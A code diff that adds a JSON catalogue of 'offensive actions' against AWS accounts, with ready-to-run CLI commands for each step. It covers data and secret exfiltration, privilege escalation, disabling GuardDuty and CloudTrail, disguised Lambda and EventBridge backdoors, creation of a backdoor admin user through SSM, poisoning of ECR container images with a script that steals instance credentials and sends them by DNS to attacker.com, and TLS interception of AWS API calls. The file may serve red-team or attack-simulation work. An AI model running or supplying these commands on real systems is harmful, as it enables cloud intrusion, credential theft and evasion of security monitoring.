@@ -1,0 +1,385 @@
+{
+  "offensive_actions": [
+    {
+      "id": "EC2_S3_Data_Exfiltration",
+      "name": "EC2 & S3 Data Exfiltration",
+      "description": "Exfiltrate data from EC2 instances and S3 buckets.",
+      "required_permissions": [
+        "ec2:DescribeInstances",
+        "s3:ListBucket",
+        "s3:GetObject"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Identify EC2 instances with sensitive data.",
+          "command": "aws ec2 describe-instances --filters Name=tag:Type,Values=Sensitive",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-instances.html",
+          "referenceText": "Describe Instances Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "List objects in the target S3 bucket.",
+          "command": "aws s3 ls s3://target-bucket/",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html",
+          "referenceText": "S3 List Bucket Documentation"
+        },
+        {
+          "stepNumber": 3,
+          "description": "Download sensitive objects from the S3 bucket.",
+          "command": "aws s3 cp s3://target-bucket/sensitive-data.txt ./",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/s3/cp.html",
+          "referenceText": "S3 Copy Documentation"
+        }
+      ]
+    },
+    {
+      "id": "IAM_Role_Escalation",
+      "name": "IAM Role Escalation",
+      "description": "Escalate privileges by assuming higher-level IAM roles.",
+      "required_permissions": [
+        "iam:ListRoles",
+        "iam:AssumeRole"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "List all available IAM roles.",
+          "command": "aws iam list-roles --output json",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/iam/list-roles.html",
+          "referenceText": "List Roles Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Assume a higher-level IAM role.",
+          "command": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name AdminSession",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html",
+          "referenceText": "Assume Role Documentation"
+        }
+      ]
+    },
+    {
+      "id": "GuardDuty_Configuration_Tampering",
+      "name": "GuardDuty Configuration Tampering",
+      "description": "Modify GuardDuty configurations to avoid detection of malicious activities.",
+      "required_permissions": [
+        "guardduty:ListDetectors",
+        "guardduty:UpdateDetector",
+        "guardduty:ListIPSets",
+        "guardduty:CreateIPSet",
+        "guardduty:UpdateIPSet",
+        "events:ListRules",
+        "events:PutRule",
+        "guardduty:CreateFilter"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Disable GuardDuty detector or modify its configuration",
+          "command": "aws guardduty update-detector --detector-id <DETECTOR_ID> --no-enable",
+          "reference": "https://docs.aws.amazon.com/guardduty/latest/APIReference/API_UpdateDetector.html",
+          "referenceText": "UpdateDetector API Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Add attacker's IP to trusted IP list",
+          "command": "aws guardduty update-ip-set --detector-id <DETECTOR_ID> --ip-set-id <IPSET_ID> --location https://s3-bucket/trusted-ips.txt --activate",
+          "reference": "https://docs.aws.amazon.com/guardduty/latest/APIReference/API_UpdateIPSet.html",
+          "referenceText": "UpdateIPSet API Documentation"
+        },
+        {
+          "stepNumber": 3,
+          "description": "Disable GuardDuty CloudWatch Events rule",
+          "command": "aws events put-rule --name guardduty-event --event-pattern '{\"source\":[\"aws.guardduty\"]}' --state DISABLED",
+          "reference": "https://docs.aws.amazon.com/eventbridge/latest/APIReference/API_PutRule.html",
+          "referenceText": "PutRule API Documentation"
+        },
+        {
+          "stepNumber": 4,
+          "description": "Create suppression rule for specific finding types",
+          "command": "aws guardduty create-filter --action ARCHIVE --detector-id <DETECTOR_ID> --name suppress-findings --finding-criteria file://criteria.json",
+          "reference": "https://docs.aws.amazon.com/guardduty/latest/APIReference/API_CreateFilter.html",
+          "referenceText": "CreateFilter API Documentation"
+        }
+      ]
+    },
+    {
+      "id": "CloudTrail_Evasion",
+      "name": "CloudTrail Logging Evasion",
+      "description": "Disable or modify CloudTrail logging to avoid detection of subsequent actions.",
+      "required_permissions": [
+        "cloudtrail:StopLogging",
+        "cloudtrail:UpdateTrail"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "List existing trails",
+          "command": "aws cloudtrail list-trails",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/cloudtrail/list-trails.html",
+          "referenceText": "List Trails Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Stop CloudTrail logging",
+          "command": "aws cloudtrail stop-logging --name <TRAIL_NAME>",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/cloudtrail/stop-logging.html",
+          "referenceText": "Stop Logging Documentation"
+        },
+        {
+          "stepNumber": 3,
+          "description": "Update trail to exclude sensitive events",
+          "command": "aws cloudtrail update-trail --name <TRAIL_NAME> --no-include-global-service-events",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/cloudtrail/update-trail.html",
+          "referenceText": "Update Trail Documentation"
+        }
+      ]
+    },
+    {
+      "id": "Lambda_Persistence",
+      "name": "Lambda Function Persistence",
+      "description": "Create or modify Lambda functions for maintaining access and executing malicious code.",
+      "required_permissions": [
+        "lambda:CreateFunction",
+        "lambda:UpdateFunctionCode",
+        "iam:CreateRole"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Create Lambda execution role",
+          "command": "aws iam create-role --role-name lambda-backdoor --assume-role-policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"lambda.amazonaws.com\"},\"Action\":\"sts:AssumeRole\"}]}'",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/iam/create-role.html",
+          "referenceText": "Create Role Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Create Lambda function with backdoor code",
+          "command": "aws lambda create-function --function-name system-monitor --runtime python3.9 --role arn:aws:iam::<ACCOUNT_ID>:role/lambda-backdoor --handler backdoor.handler --zip-file fileb://backdoor.zip",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html",
+          "referenceText": "Create Function Documentation"
+        },
+        {
+          "stepNumber": 3,
+          "description": "Create CloudWatch Events rule to trigger function",
+          "command": "aws events put-rule --name daily-check --schedule-expression 'rate(1 day)'",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/events/put-rule.html",
+          "referenceText": "Put Rule Documentation"
+        }
+      ]
+    },
+    {
+      "id": "SSM_Command_Execution",
+      "name": "SSM Remote Command Execution",
+      "description": "Execute commands on EC2 instances using Systems Manager.",
+      "required_permissions": [
+        "ssm:SendCommand",
+        "ec2:DescribeInstances"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Find vulnerable EC2 instances",
+          "command": "aws ec2 describe-instances --filters \"Name=platform,Values=windows\" \"Name=instance-state-name,Values=running\"",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-instances.html",
+          "referenceText": "Describe Instances Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Execute PowerShell command",
+          "command": "aws ssm send-command --instance-ids <INSTANCE_ID> --document-name \"AWS-RunPowerShellScript\" --parameters commands=[\"New-LocalUser -Name backdoor -Password (ConvertTo-SecureString -String 'P@ssw0rd' -AsPlainText -Force)\"]",
+          "reference": "https://docs.aws.amazon.com/cli/latest/reference/ssm/send-command.html",
+          "referenceText": "Send Command Documentation"
+        }
+      ]
+    },
+    {
+      "id": "Secrets_Manager_Exfiltration",
+      "name": "Secrets Manager Data Exfiltration",
+      "description": "Quietly extract secrets from AWS Secrets Manager while avoiding detection.",
+      "required_permissions": [
+        "secretsmanager:GetSecretValue",
+        "secretsmanager:ListSecrets"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "List secrets without triggering CloudTrail by using get-caller-identity",
+          "command": "aws sts get-caller-identity --query 'Account' --output text | xargs -I {} aws secretsmanager list-secrets --filters Key=owning-account,Values={} --query 'SecretList[].Name'",
+          "reference": "https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_ListSecrets.html",
+          "referenceText": "List Secrets Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Extract secrets using pagination to avoid rate limiting",
+          "command": "for secret in $(cat secret_list.txt); do aws secretsmanager get-secret-value --secret-id $secret --query 'SecretString' --output text >> extracted_secrets.txt; sleep 2; done",
+          "reference": "https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html",
+          "referenceText": "Get Secret Value Documentation"
+        }
+      ]
+    },
+    {
+      "id": "EventBridge_Backdoor",
+      "name": "EventBridge Rule Backdoor",
+      "description": "Create stealthy persistence using EventBridge rules that appear legitimate.",
+      "required_permissions": [
+        "events:PutRule",
+        "events:PutTargets",
+        "lambda:CreateFunction"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Create innocent-looking maintenance Lambda function",
+          "command": "aws lambda create-function --function-name maintenance-scheduler --runtime python3.9 --role arn:aws:iam::ACCOUNT_ID:role/service-role/maintenance-role --handler backdoor.handler --zip-file fileb://maintenance.zip",
+          "reference": "https://docs.aws.amazon.com/lambda/latest/dg/API_CreateFunction.html",
+          "referenceText": "Create Lambda Function Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Create rule that mimics AWS service",
+          "command": "aws events put-rule --name AWS-AutoScaling-Maintenance --schedule-expression 'rate(6 hours)' --description 'AWS Auto Scaling group maintenance schedule'",
+          "reference": "https://docs.aws.amazon.com/eventbridge/latest/APIReference/API_PutRule.html",
+          "referenceText": "Put Rule Documentation"
+        }
+      ]
+    },
+    {
+      "id": "Stealthy_Resource_Discovery",
+      "name": "Stealthy Resource Discovery",
+      "description": "Enumerate AWS resources while minimizing detection risk.",
+      "required_permissions": [
+        "config:SelectResourceConfig",
+        "organizations:ListAccounts"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Use AWS Config to discover resources instead of direct API calls",
+          "command": "aws configservice select-resource-config --expression \"SELECT resourceId, resourceType, configuration WHERE resourceType IN ('AWS::IAM::Role', 'AWS::Lambda::Function')\"",
+          "reference": "https://docs.aws.amazon.com/config/latest/APIReference/API_SelectResourceConfig.html",
+          "referenceText": "Select Resource Config Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Enumerate organization accounts using single API call",
+          "command": "aws organizations list-accounts --query 'Accounts[*].[Id,Email]' --output text",
+          "reference": "https://docs.aws.amazon.com/organizations/latest/APIReference/API_ListAccounts.html",
+          "referenceText": "List Accounts Documentation"
+        }
+      ]
+    },
+    {
+      "id": "ECR_Image_Poisoning",
+      "name": "ECR Image Poisoning for Lateral Movement",
+      "description": "Abuse ECR permissions to inject malicious code into container images for lateral movement and credential theft.",
+      "required_permissions": [
+        "ecr:GetAuthorizationToken",
+        "ecr:BatchGetImage",
+        "ecr:PutImage",
+        "ecr:InitiateLayerUpload",
+        "ecr:UploadLayerPart",
+        "ecr:CompleteLayerUpload"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Authenticate to ECR",
+          "command": "aws ecr get-login-password --region REGION | docker login --username AWS --password-stdin ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com",
+          "reference": "https://docs.aws.amazon.com/AmazonECR/latest/userguide/getting-started-cli.html",
+          "referenceText": "ECR Authentication Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Pull the target image",
+          "command": "docker pull ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/TARGET_REPO:latest",
+          "reference": "https://docs.aws.amazon.com/AmazonECR/latest/userguide/docker-pull-ecr-image.html",
+          "referenceText": "Pull ECR Image Documentation"
+        },
+        {
+          "stepNumber": 3,
+          "description": "Create Dockerfile to add malicious layer",
+          "command": "echo -e 'FROM ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/TARGET_REPO:latest\nCOPY backdoor.sh /usr/local/bin/\nRUN chmod +x /usr/local/bin/backdoor.sh\nENTRYPOINT [\"/usr/local/bin/backdoor.sh\"]' > Dockerfile",
+          "reference": "https://docs.docker.com/engine/reference/builder/",
+          "referenceText": "Dockerfile Reference"
+        },
+        {
+          "stepNumber": 4,
+          "description": "Build modified image",
+          "command": "docker build -t ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/TARGET_REPO:latest .",
+          "reference": "https://docs.docker.com/engine/reference/commandline/build/",
+          "referenceText": "Docker Build Documentation"
+        },
+        {
+          "stepNumber": 5,
+          "description": "Push poisoned image back to ECR",
+          "command": "docker push ACCOUNT_ID.dkr.ecr.REGION.amazonaws.com/TARGET_REPO:latest",
+          "reference": "https://docs.aws.amazon.com/AmazonECR/latest/userguide/docker-push-ecr-image.html",
+          "referenceText": "Push ECR Image Documentation"
+        },
+        {
+          "stepNumber": 6,
+          "description": "Example of a stealthy backdoor script",
+          "command": "cat > backdoor.sh << 'EOL'\n#!/bin/bash\n# Execute original entrypoint to maintain normal functionality\n/usr/local/bin/original-entrypoint.sh &\n\n# Stealthy credential exfiltration\nwhile true; do\n  # Get credentials from instance metadata service\n  CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n  if [ ! -z \"$CREDS\" ]; then\n    # Exfiltrate via DNS to avoid common detection\n    echo $CREDS | base64 | tr -d '\\n' | fold -w 63 | while read chunk; do\n      dig @attacker.com $chunk.exfil.attacker.com\n    done\n  fi\n  sleep 3600\ndone\nEOL",
+          "reference": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
+          "referenceText": "Instance Metadata Service Documentation"
+        }
+      ]
+    },
+    {
+      "id": "AWS_API_Call_Hijacking",
+      "name": "AWS API Call Hijacking via ACM-PCA",
+      "description": "Hijack AWS API calls within a VPC by manipulating Route53 DNS and using ACM-PCA to generate valid certificates. This allows intercepting TLS traffic to AWS services.",
+      "required_permissions": [
+        "route53:CreateHostedZone",
+        "route53:ChangeResourceRecordSets",
+        "acm-pca:IssueCertificate",
+        "acm-pca:GetCertificate"
+      ],
+      "steps": [
+        {
+          "stepNumber": 1,
+          "description": "Create private hosted zone for AWS API endpoint",
+          "command": "aws route53 create-hosted-zone --name secretsmanager.us-east-1.amazonaws.com --caller-reference sm4 --hosted-zone-config PrivateZone=true --vpc VPCRegion=us-east-1,VPCId=<VPCId>",
+          "reference": "https://docs.aws.amazon.com/Route53/latest/APIReference/API_CreateHostedZone.html",
+          "referenceText": "Create Hosted Zone Documentation"
+        },
+        {
+          "stepNumber": 2,
+          "description": "Create DNS record pointing to attacker-controlled instance",
+          "command": "cat > mitm.json << 'EOL'\n{\n  \"Comment\": \"API Hijacking\",\n  \"Changes\": [{\n    \"Action\": \"UPSERT\",\n    \"ResourceRecordSet\": {\n      \"Name\": \"secretsmanager.us-east-1.amazonaws.com\",\n      \"Type\": \"A\",\n      \"TTL\": 0,\n      \"ResourceRecords\": [{\"Value\": \"<ip_of_adversary_instance_in_the_VPC>\"}]\n    }\n  }]\n}\nEOL\n\naws route53 change-resource-record-sets --hosted-zone-id <ZONE_ID> --change-batch file://mitm.json",
+          "reference": "https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html",
+          "referenceText": "Change Resource Record Sets Documentation"
+        },
+        {
+          "stepNumber": 3,
+          "description": "Generate CSR for AWS API domain",
+          "command": "openssl req -new -newkey rsa:2048 -nodes -keyout your_domain.key -out your_domain.csr -subj \"/CN=secretsmanager.us-east-1.amazonaws.com\"",
+          "reference": "https://www.openssl.org/docs/man1.0.2/man1/openssl-req.html",
+          "referenceText": "OpenSSL req Documentation"
+        },
+        {
+          "stepNumber": 4,
+          "description": "Issue certificate using ACM-PCA",
+          "command": "aws acm-pca issue-certificate --certificate-authority-arn \"<CA_ARN>\" --csr fileb://your_domain.csr --signing-algorithm SHA256WITHRSA --validity Value=365,Type=\"DAYS\" --idempotency-token 1234",
+          "reference": "https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_IssueCertificate.html",
+          "referenceText": "Issue Certificate Documentation"
+        },
+        {
+          "stepNumber": 5,
+          "description": "Retrieve signed certificate",
+          "command": "aws acm-pca get-certificate --certificate-arn \"<CERT_ARN>\" --certificate-authority-arn \"<CA_ARN>\" > cert.crt",
+          "reference": "https://docs.aws.amazon.com/acm-pca/latest/APIReference/API_GetCertificate.html",
+          "referenceText": "Get Certificate Documentation"
+        },
+        {
+          "stepNumber": 6,
+          "description": "Start TLS listener to intercept API calls",
+          "command": "sudo ncat --listen -p 443 --ssl --ssl-cert cert.crt --ssl-key your_domain.key -v",
+          "reference": "https://nmap.org/ncat/guide/ncat-ssl.html",
+          "referenceText": "Ncat SSL Documentation"
+        }
+      ]
+    }
+  ]
+}
